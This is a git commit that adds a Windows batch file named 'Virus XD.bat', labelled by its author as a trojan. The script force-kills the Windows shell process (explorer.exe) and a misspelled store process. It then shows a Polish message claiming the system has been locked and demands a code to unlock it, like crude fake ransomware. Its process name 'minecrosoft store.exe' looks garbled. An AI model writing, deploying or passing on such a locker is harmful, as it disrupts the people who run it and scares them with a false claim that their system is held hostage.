01d732602a431656bf8b1a5a1b2801788f0bf99d
Kubas431 <kuba80269@gmail.com>
2024-09-13 20:03:18 +0200

    Create Virus XD.bat
    The Trojan not joke!!!

---
+++ Virus XD.bat
@@ -0,0 +1,10 @@
+@echo off
+taskkill /f /im explorer.exe
+taskkill /f /im minecrosoft store.exe
+cls
+echo twuj system zostal zablokowany przez XD virus:)
+echo zeby go odzyskac wpisz kod:(
+set code=""
+
+:code
+set /p code="Wpisz kod XDDDDDDD"
